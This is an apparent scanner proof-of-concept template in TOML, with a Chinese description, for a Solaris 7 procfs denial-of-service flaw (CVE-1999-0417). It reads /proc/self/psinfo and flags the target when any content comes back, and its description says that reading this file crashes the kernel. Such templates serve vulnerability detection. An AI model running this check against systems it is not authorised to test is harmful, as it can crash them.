[info]
author = "AVE"
description = "检测目标是否运行 Solaris 7 且 /proc/self/psinfo 文件可访问，该文件被读取时触发内核崩溃导致拒绝服务"
id = "POC-AVE-1999-0065"
name = "Sun Solaris 7.0 procfs 拒绝服务漏洞 PoC"
severity = "medium"
tags = ["ave-1999-0065"]
vuln_id = [
    "CVE-1999-0417",
    "AVE-1999-0065",
]

[poc]
logic = "all"

[[poc.requests]]
path = "/proc/self/psinfo"
protocol = "file"

[[poc.requests.matchers]]
expect = true
part = "body"
regex = "."
type = "regex"
